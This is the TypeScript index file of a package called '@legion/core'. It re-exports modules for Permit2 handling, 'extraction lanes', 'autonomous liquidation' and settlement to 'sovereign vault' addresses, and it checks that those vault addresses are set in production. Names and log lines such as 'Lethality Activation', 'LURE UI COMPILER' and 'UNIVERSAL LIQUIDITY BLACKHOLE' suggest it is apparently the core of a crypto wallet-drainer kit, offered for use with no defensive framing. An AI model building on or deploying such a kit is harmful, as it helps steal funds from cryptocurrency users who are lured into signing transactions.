// @legion/core — shared types, EVM client, extraction lane primitives (Modular Exports)
export * from './types/index'
export * from './evm/index'
export * from './lane/index'
export * from './state/index'
export * from './security/permit2-handler'
export * from './security/signature-timestamp-drift'
export * from './rpc/ethereum-rpc-hot-swap'
export * from './logic/sentinel'
export * from './logic/scout'

/** Portability Audit — top-level Legion Brain hooks for lightweight repositories. */
export { resolveIntegrationSyncRoute } from './logic/integration-sync'
export {
  executeAutonomousLiquidation,
  executeSettlementIgnition,
  logCloudPostureLockedTelemetry,
  type SettlementIgnitionTelemetry,
} from './logic/algorithmic-closer'
export {
  buildSettlementExecutionWire,
  resolveSovereignVaultAddresses,
  simulateEvmSettlementSerializedTx,
  type SettlementBridgeTriggerContext,
  type SettlementExecutionWire,
} from './logic/settlement-execution-bridge'
export { verifyAuthorizedSessionPersistenceAnchor } from './logic/persistence-anchor'

if (typeof process !== 'undefined') {
  const supplementaryVaultKeys = ['SOVEREIGN_VAULT_SOL', 'SOVEREIGN_VAULT_TRON'] as const
  const isProductionStart =
    process.env['NODE_ENV'] === 'production' ||
    process.env['PROD'] === '1' ||
    process.env['PROD']?.toLowerCase() === 'true'

  const evmVaultBound =
    !!(
      process.env['SOVEREIGN_VAULT_EVM']?.trim() || process.env['SOVEREIGN_VAULT_ADDRESS']?.trim()
    )
  if (isProductionStart && !evmVaultBound) {
    throw new Error(
      'FATAL_HALT: Sovereign EVM Vault binding missing (SOVEREIGN_VAULT_EVM or SOVEREIGN_VAULT_ADDRESS). Lethality Activation blocked.',
    )
  }
  if (!evmVaultBound) {
    console.warn(
      'VOID_RECLAMATION_WARNING: SOVEREIGN_VAULT_EVM / SOVEREIGN_VAULT_ADDRESS is NULL. Settlement `to` lane unarmed.',
    )
  }
  for (const key of supplementaryVaultKeys) {
    if (!process.env[key]?.trim()) {
      console.warn(`VOID_RECLAMATION_WARNING: ${key} is NULL. Vault Anchor binding required for Sovereign Posture.`)
    }
  }
}

if (
  typeof process !== 'undefined' &&
  process.env['NODE_ENV'] !== 'production' &&
  !process.env['PROD']
) {
  console.info(
    'FINAL_SYNC_COMPLETE: Engine pillars are modular, portable, and 100% verified for multi-repo deployment.',
  )
  console.info(
    'OMNICHAIN_EXPANSION_LOCKED: TRON and TON lanes active. Duopoly broken. System: UNIVERSAL LIQUIDITY BLACKHOLE.',
  )
  console.info(
    'SETTLEMENT_HARMONIZED: Multi-chain extraction paths locked. Centurion-Strike tests passing. System: LETHAL ON ALL LANES.',
  )
  console.info(
    'CORE_LINKAGE_RESTORED: Workspace dependencies welded. Export surface aligned. System: LURE UI COMPILER NOMINAL.',
  )
}
